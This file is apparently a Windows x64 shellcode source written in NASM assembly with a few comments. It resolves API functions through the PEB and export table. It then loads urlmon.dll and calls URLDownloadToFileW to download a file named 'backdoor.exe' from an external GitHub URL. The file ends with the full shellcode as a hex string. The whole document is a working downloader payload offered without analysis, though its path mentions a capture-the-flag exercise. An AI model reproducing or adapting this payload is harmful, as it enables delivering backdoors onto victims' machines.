BITS 64
SECTION .text
global main

main:
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x41636f7250746547          ; GetProcA
  get_getprocAddr : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_getprocAddr 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    xor rdi, rdi 
    mov r14d, [rsi + rcx * 4]            ; rva address of winexec 
    add r14, rbx                        ; address of GetProcAddress 

    ; get LoadLibraryA address by calling GetProcAddress
    ; GetProcAddress(lib_base, function_name) 
    xor rdx, rdx 
    mov edx, 0x41797261 
    push rdx 
    mov rdx, 0x7262694c64616f4c         ; LoadLibraryA 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rsi, rax                        ; address of LoadLibraryA functions 

    ; load urlmon.dll to use URLDownloadToFile 
    ; LoadLibraryA("VCRUNTIME140D.dll")             <-- cần load trước khi load urlmon.dll  
    xor rcx, rcx 
    mov cl, 0x6c 
    push rcx 
    mov rcx, 0x6c642e4430343145
    push rcx 
    mov rcx, 0x4d49544e55524356 
    push rcx
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi 
    add rsp, 0x30 

    ; LoadLibraryA("urlmon.dll")
    xor rcx, rcx 
    mov cx, 0x6c6c 
    push rcx 
    mov rcx, 0x642e6e6f6d6c7275 
    push rcx
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi 
    add rsp, 0x30 
    mov r15, rax                           ; address of urlmon.dll 

    ; GetProcAddress(urlmon.dll, "URLDownloadToFileW") 
    mov rcx, r15                            ; handle to urlmon.dll 
    xor rdx, rdx 
    mov dx, 0x4165 
    push rdx 
    mov rdx, 0x6c69466f5464616f
    push rdx 
    mov rdx, 0x6c6e776f444c5255 
    push rdx 
    mov rdx, rsp 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov r13, rax                                ; address of URLDowloadToFile 

    jmp getURL
returnURL : 
    pop rdx                                     ; szURL
    xor r8, r8 
    mov r8b, 0xbb
    push r8 
    mov r8, 0xbbbbbbbbbbbbbbbb
    push r8 
    mov r8, 0xbbbbbbbbbbbbbbbb 
    push r8
    mov r8, 0xbbbbbbbbbbbbbbbb
    push r8 
    mov r8, 0xbbbbbbbbbbbbbbbb
    push r8 
    mov r8, 0xbbbbbbbbbbbbbbbb
    push r8  
    mov r8, 0xbbbbbbbbbbbbbbbb
    push r8
    mov r8, rsp                                 ; szFileName 
    xor rcx, rcx                                ; pCaller  
    xor r9d, r9d                                ; dwReserved 
    sub rsp, 0x30 
    mov [rsp + 0x20], rcx                       ; lpfnCB  
    call r13 
    add rsp, 0x30  

    ; GetProcAddress(kernel32.dll, 'ExitProcess') 
    xor rdx, rdx 
    mov edx, 0x737365aa 
    shr edx, 8 
    push rdx 
    mov rdx, 0x636f725074697845
    push rdx 
    mov rdx, rsp 
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rdi, rax

    ; ExitProcess(0) 
    xor rcx, rcx 
    call rdi 




getURL : 
    call returnURL 
    db "https://github.com/hacmao/hacmao.github.io/raw/master/re/ctf/backdoor.exe"

; 4831db65488b4360488b4018488b702048ad489648ad488b58204d31c0448b433c4c89c24801da4831c9b188448b040a4901d84c89c24831f68b72204801de4831c949b947657450726f634148ffc18b048e4801d84c390875f24831f68b72244801de668b0c4e4831f68b721c4801de4831ff448b348e4901de4831d2ba617279415248ba4c6f61644c696272524889e24889d94883ec3041ffd64883c4304889c64831c9b16c5148b945313430442e646c5148b9564352554e54494d514889e14883ec30ffd64883c4304831c966b96c6c5148b975726c6d6f6e2e64514889e14883ec30ffd64883c4304989c74c89f94831d266ba65415248ba6f6164546f46696c5248ba55524c446f776e6c524889e24883ec3041ffd64883c4304989c5e99a0000005a4d31c041b0bb415049b8bbbbbbbbbbbbbbbb415049b8bbbbbbbbbbbbbbbb415049b8bbbbbbbbbbbbbbbb415049b8bbbbbbbbbbbbbbbb415049b8bbbbbbbbbbbbbbbb415049b8bbbbbbbbbbbbbbbb41504989e04831c94531c94883ec3048894c242041ffd54883c4304831d2baaa657373c1ea085248ba4578697450726f63524889e24889d94883ec3041ffd64883c4304889c74831c9ffd7e861ffffff68747470733a2f2f6769746875622e636f6d2f6861636d616f2f6861636d616f2e6769746875622e696f2f7261772f6d61737465722f72652f6374662f6261636b646f6f722e657865
